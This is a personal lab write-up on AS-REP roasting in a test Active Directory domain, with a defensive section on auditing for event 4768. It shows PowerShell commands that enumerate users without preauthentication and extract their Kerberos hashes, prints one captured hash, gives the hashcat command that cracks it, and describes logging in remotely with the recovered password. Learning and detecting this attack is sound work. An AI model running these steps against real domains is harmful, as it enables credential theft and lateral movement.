# PreAuth Disabled

### Kerberos Recap

Kerberos is an authenticaiton mechanism used to access different services on a domain. 
When a user needs access to a services, it starts by requesting a ticket granting ticket (TGT) fromt the key distribution center (KDC) by providing a timestamp encrypted with the user's credential. The KDC, receives the request, validates it and responds with a TGT. This TGT can the be used to request a Ticket granting service (TGS) ticket. 

### PreAuth Disabled

If a user account has preauthentication disabled, any domain account can request a TGT ticket on behalf of the user without providing credentials. This TGT will contain a hash of the user which can then be cracked offline.


### To exploit this, I disabled preauthentication for the pbeesly user. 

This can be done from "Active Directory Users and Computers" in Server Manager.

![[Pasted image 20210906211934.png]]

Now that this configuration is complete, I can hunt down this user with different tools

### Finding PreAuth Disabled users with AsRepRoast.ps1

https://github.com/HarmJ0y/ASREPRoast


Invoke-AsRepRoast # Enumerates users with preauthentication disabled

![[Pasted image 20210906213105.png]]

Get-AsRepHash -Username pbeesly # Request a TGT for pbeesly and extract the hash 

![[Pasted image 20210906213201.png]]

$krb5asrep$pbeesly@DUNDER-MIFFLIN.local:1d5b42b4a3d644b4c58ef770f6b4d75f$ffa1331ccf8384fc60e1476e3dc4468135ef600c71f985df2e5d77be9f9d93d10b69d7b25c5267197d0f0d54d994c1d46f3516a856a7a749a1c122eb1cceda22a3522f477647cb94ff5a63bc8b530cce0f9ddeb95b8154f0d9b523ace55ccb8e6fb2fd3050c0cb2e2977923f9c34115239e5e195f70dfd45595c4ad716f9bda4b167ef0147e425e8b826dfec56f795400ab4af048ab6fd2d9d959cdbe71aeaf56133ef644e522260ee2cd08788d0d529f25cb29caf5883d994f312ddee55111a37589a79009bcb0d2050bdd1dcd9e30096075d414940b1498d0ec45398fed0becff70f68d3fbcc167d482dc2a12a1b8015b39412f30af497f5157ea8

I wanted to see what the event log looked like from the Domain Controller and noticed that it is not logging 4768 - A Kerberos authentication ticket was requested. 

![[Pasted image 20210906213838.png]]

To configure this, I had to go into Group Policy Management, and configure the "Default Domain Controllers Policy"

Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy > Audit Policies > Logon/Logoff > Audit Kerberos Authentication Service 

![[Pasted image 20210906214332.png]]

After this configuration, I was able to see the malicious TGT request

![[Pasted image 20210906215531.png]]

This windows event log is very difficult to detect. The only suspicious field is that the Client Address is 192.168.138.170, the IP address of the dschrute-computer. 

Hashcat can be used to crack the hash from earlier.

#### hashcat64.exe -m 18200 hash.txt rockyou.txt -O

![[Pasted image 20210906220616.png]]

From dschrute's computer, I was able to powershell remote into pbeesly's computer using her credentials.

![[Pasted image 20210906221010.png]]